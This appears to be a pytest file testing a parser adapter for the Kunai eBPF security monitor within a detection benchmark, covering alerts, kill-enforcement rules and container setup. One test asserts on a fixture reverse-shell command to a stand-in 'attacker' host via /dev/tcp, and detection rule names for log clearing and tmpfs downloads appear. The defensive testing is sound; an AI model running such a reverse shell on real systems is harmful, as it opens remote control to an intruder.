from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from bench.adapters.kunai import Adapter

FIXTURES = Path(__file__).parent / "fixtures" / "kunai"
EMITTED_AT = 1_700_000_000.0


@pytest.fixture
def adapter() -> Adapter:
    return Adapter()


def fixture_lines(name: str) -> list[str]:
    return (FIXTURES / name).read_text().splitlines()


def test_alerts_parsed(adapter: Adapter) -> None:
    alerts = [adapter.parse(line, EMITTED_AT) for line in fixture_lines("alerts.jsonl")]
    parsed = [alert for alert in alerts if alert is not None]
    assert len(parsed) == 3
    assert alerts[3] is None
    assert alerts[4] is None
    assert alerts[5] is None


def test_detection_fields(adapter: Adapter) -> None:
    line = fixture_lines("alerts.jsonl")[0]
    alert = adapter.parse(line, EMITTED_AT)
    assert alert is not None
    assert alert.tool == "kunai"
    assert alert.rule == "mimic.kthread"
    assert alert.severity == "10"
    assert alert.emitted_at == EMITTED_AT
    assert alert.event_at == pytest.approx(1749564042.814301, abs=1e-3)
    assert alert.container_name == "ubuntu-kunai-test"
    assert alert.container_id is None
    assert alert.process == "/usr/bin/mktemp"
    assert alert.command_line == "mktemp -d -p /tmp/trash"
    assert alert.raw == json.loads(line)


def test_ioc_detection_without_container(adapter: Adapter) -> None:
    alert = adapter.parse(fixture_lines("alerts.jsonl")[1], EMITTED_AT)
    assert alert is not None
    assert alert.rule == "ioc:kunai-project.github.io"
    assert alert.severity == "7"
    assert alert.container_name is None
    assert alert.container_id is None
    assert alert.process == "/usr/bin/curl"


def test_hostname_container_id(adapter: Adapter) -> None:
    alert = adapter.parse(fixture_lines("alerts.jsonl")[2], EMITTED_AT)
    assert alert is not None
    assert alert.rule == "exec.shell.dev_tcp_redirection"
    assert alert.container_id == "3f1c2a9b7d4e"
    assert alert.container_name == "3f1c2a9b7d4e"
    assert alert.command_line == "bash -c bash -i >& /dev/tcp/attacker/4444 0>&1"


def test_enforcement_kept_in_raw(adapter: Adapter) -> None:
    line = fixture_lines("enforce.jsonl")[0]
    alert = adapter.parse(line, EMITTED_AT)
    assert alert is not None
    assert alert.rule == "exec.shell.dev_tcp_redirection"
    assert alert.raw["detection"]["actions"] == ["kill"]
    plain = adapter.parse(fixture_lines("alerts.jsonl")[2], EMITTED_AT)
    assert plain is not None
    assert "actions" not in plain.raw["detection"]


def test_enforcement_hooks(adapter: Adapter) -> None:
    killing = adapter.parse(fixture_lines("enforce.jsonl")[0], EMITTED_AT)
    plain = adapter.parse(fixture_lines("alerts.jsonl")[2], EMITTED_AT)
    assert killing.action == "kill" and adapter.is_enforcement(killing)
    assert plain.action is None and not adapter.is_enforcement(plain)
    logs = fixture_lines("logs.txt")
    assert adapter.enforcement_check(logs) is True
    assert adapter.enforcement_check([line for line in logs if "SIGKILL" not in line]) is None
    stamped = [(float(index), line) for index, line in enumerate(logs)]
    assert adapter.confirmed_enforcements(stamped) == [3.0]


def test_enforce_rules_spare_benign_behaviors() -> None:
    repo = Path(__file__).resolve().parents[2]
    rules_file = repo / "tools" / "kunai" / "enforce" / "rules.yaml"
    if not rules_file.is_file():
        pytest.skip("tools directory not available")
    documents = rules_file.read_text().split("\n---\n")
    killing = {
        re.search(r"^name: (\S+)", document, re.M).group(1)
        for document in documents
        if "actions: [ kill ]" in document
    }
    tuned = (repo / "tools" / "kunai" / "tuned" / "rules.yaml").read_text().split("\n---\n")
    assert len(documents) == len(tuned)
    assert "exec.shell.dev_tcp_redirection" in killing
    for name in (
        "exec.from.tmpfs",
        "download.to.tmpfs",
        "chmod.exec.in.tmpfs",
        "defense_evasion.logs.clear",
        "defense_evasion.logs.delete",
        "discovery.container.environment",
        "discovery.system.information",
    ):
        assert name not in killing


def test_non_alert_lines(adapter: Adapter) -> None:
    for line in fixture_lines("logs.txt"):
        assert adapter.parse(line, EMITTED_AT) is None


def test_profiles(adapter: Adapter) -> None:
    assert adapter.profiles == ("default", "tuned", "enforce", "community")


@pytest.mark.parametrize("profile", ["default", "tuned", "enforce", "community"])
def test_container_spec(adapter: Adapter, profile: str, tmp_path: Path) -> None:
    root = Path("/srv/bench")
    spec = adapter.container_spec(root, profile, tmp_path)
    assert spec.build_context is None
    assert spec.image == f"ebpf-bench/kunai:{adapter.version}"
    assert spec.privileged
    assert spec.pid_mode == "host"
    mounts = {mount.target: mount for mount in spec.mounts}
    assert mounts["/etc/kunai"].source == str(root / "tools" / "kunai" / profile)
    assert mounts["/etc/kunai"].read_only
    for target in ("/sys/kernel/debug", "/sys/kernel/btf", "/sys/fs/bpf"):
        assert mounts[target].source == target
    assert spec.command == ["run", "-c", "/etc/kunai/config.yaml"]
    start_line = fixture_lines("alerts.jsonl")[3]
    assert spec.ready_pattern is not None
    assert re.search(spec.ready_pattern, start_line)
    assert not re.search(spec.ready_pattern, fixture_lines("alerts.jsonl")[0])


def test_profiles_exist(adapter: Adapter) -> None:
    repo = Path(__file__).resolve().parents[2]
    if not (repo / "tools" / "kunai").is_dir():
        pytest.skip("tools directory not available")
    for profile in adapter.profiles:
        assert (adapter.config_dir(repo, profile) / "config.yaml").is_file()
    assert (adapter.config_dir(repo, "tuned") / "rules.yaml").is_file()
    assert (adapter.config_dir(repo, "enforce") / "rules.yaml").is_file()


def test_community_sources_pinned(adapter: Adapter) -> None:
    repo = Path(__file__).resolve().parents[2]
    community = adapter.config_dir(repo, "community")
    if not community.is_dir():
        pytest.skip("tools directory not available")
    pinned = re.compile(r"https://raw\.githubusercontent\.com/kunai-project/community-rules/[0-9a-f]{40}/\S+")
    entries = [line.split() for line in (community / "sources.txt").read_text().splitlines() if line.strip()]
    assert entries
    for checksum, url, dest in entries:
        assert re.fullmatch(r"[0-9a-f]{64}", checksum)
        assert pinned.fullmatch(url)
    config = (community / "config.yaml").read_text()
    assert "    - /etc/kunai/rules\n" in config
    default = (adapter.config_dir(repo, "default") / "config.yaml").read_text()
    assert config == default.replace("  rules: []\n", "  rules:\n    - /etc/kunai/rules\n")


def test_community_rules_fetched(adapter: Adapter) -> None:
    repo = Path(__file__).resolve().parents[2]
    community = adapter.config_dir(repo, "community")
    if not (community / "sources.txt").is_file():
        pytest.skip("tools directory not available")
    entries = [line.split() for line in (community / "sources.txt").read_text().splitlines() if line.strip()]
    if not all((community / dest).is_file() for _, _, dest in entries):
        pytest.skip("community rules not fetched, run docker compose up community-rules")
    assert (community / "rules" / "00-dependencies.kun").is_file()
